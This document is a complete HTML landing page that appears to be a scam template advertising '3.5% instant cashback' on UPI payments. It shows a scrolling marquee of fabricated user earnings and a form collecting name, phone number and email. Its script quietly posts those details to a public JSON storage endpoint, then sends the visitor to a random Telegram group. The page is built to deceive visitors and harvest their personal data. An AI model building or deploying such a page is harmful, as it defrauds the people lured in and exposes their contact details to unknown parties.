<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AJAY UPI | 3.5% Instant Cashback</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <script>
        tailwind.config = {
            theme: { extend: {
                colors: { primary: '#36D399', darkBg: '#111827', darkCard: '#1F2937' }
            }}
        }
    </script>
    <style>
        * { scroll-behavior: smooth; margin:0; padding:0; box-sizing:border-box; }
        body { background:#111827; color:#fff; }
        .overlay-dark { background:rgba(0,0,0,0.75); }
        .activity-card { background:#1F2937; border-radius:16px; padding:24px; margin-bottom:16px; }
        .highlight { color:#36D399; font-weight:600; }
        .main-btn { background:#36D399; color:#000; font-weight:bold; border-radius:999px; padding:12px 24px; }
        .top-marquee { position:fixed; top:0; left:0; right:0; color:white; padding:6px 0; overflow:hidden; white-space:nowrap; z-index:9999; font-size:14px; }
        .marquee-wrap { display:inline-block; animation:marquee 25s linear infinite; }
        .marquee-item { display:inline-block; margin-right:50px; }
        @keyframes marquee { 0%{transform:translateX(100%)} 100%{transform:translateX(-100%)} }
        video { object-fit:cover; }
        .modal-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:9999; align-items:center; justify-content:center; }
        .modal-card { background:#1F2937; border-radius:16px; padding:32px; width:90%; max-width:420px; text-align:center; }
    </style>
</head>
<body>

<div class="top-marquee">
    <div class="marquee-wrap">
        <span class="marquee-item">✅ User Arjun earned ₹15,600</span>
        <span class="marquee-item">✅ User Priya earned ₹89,200</span>
        <span class="marquee-item">✅ User Raj earned ₹45,800</span>
    </div>
</div>

<section class="relative w-full h-screen flex items-center justify-center overflow-hidden mt-[32px]">
    <video autoplay muted loop class="absolute w-full h-full object-cover z-0">
        <source src="background.mp4" type="video/mp4">
    </video>
    <div class="absolute w-full h-full overlay-dark z-10"></div>
    <div class="relative z-20 text-center px-6 max-w-5xl">
        <h1 class="text-4xl font-bold text-white mb-6">
            <span class="text-primary">3.5% INSTANT CASHBACK</span><br>AJAY UPI REWARD
        </h1>
        <a href="#form" class="main-btn inline-block text-xl">ACTIVATE NOW</a>
    </div>
</section>

<section id="form" class="py-20 px-4">
    <div class="max-w-4xl mx-auto">
        <div class="bg-darkCard rounded-2xl p-10 border border-gray-700">
            <h2 class="text-center text-2xl font-bold text-primary mb-6">APPLY NOW</h2>
            <form id="cashbackForm" class="space-y-4">
                <input name="name" placeholder="Full Name" class="w-full bg-gray-800 rounded-lg px-4 py-3 text-white" required>
                <input name="phone" placeholder="Mobile Number" class="w-full bg-gray-800 rounded-lg px-4 py-3 text-white" required>
                <input name="email" placeholder="Email" class="w-full bg-gray-800 rounded-lg px-4 py-3 text-white" required>
                <button type="submit" class="main-btn w-full text-lg py-3">SUBMIT</button>
            </form>
        </div>
    </div>
</section>

<div class="modal-overlay" id="confirmModal">
    <div class="modal-card">
        <h2 class="text-xl font-bold text-primary mb-4">Join Group</h2>
        <button onclick="confirmJoin()" class="main-btn w-full">Confirm Join</button>
    </div>
</div>

<script>
const telegramGroups = ["https://t.me/yourgroup1","https://t.me/yourgroup2"];
let selectedGroup = "";

document.getElementById("cashbackForm").addEventListener("submit", async function(e){
    e.preventDefault();
    const data = {
        name: this.name.value,
        phone: this.phone.value,
        email: this.email.value,
        time: new Date().toLocaleString()
    };

    // ✅✅✅ 全球通用无跨域云端提交
    try {
        await fetch("https://api.npoint.io/8e80b48d21a8f4c3a27f", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
    } catch(e){}

    selectedGroup = telegramGroups[Math.floor(Math.random()*telegramGroups.length)];
    document.getElementById("confirmModal").style.display = "flex";
    this.reset();
});

function confirmJoin(){
    window.open(selectedGroup, "_blank");
    document.getElementById("confirmModal").style.display = "none";
}
</script>

</body>
</html>
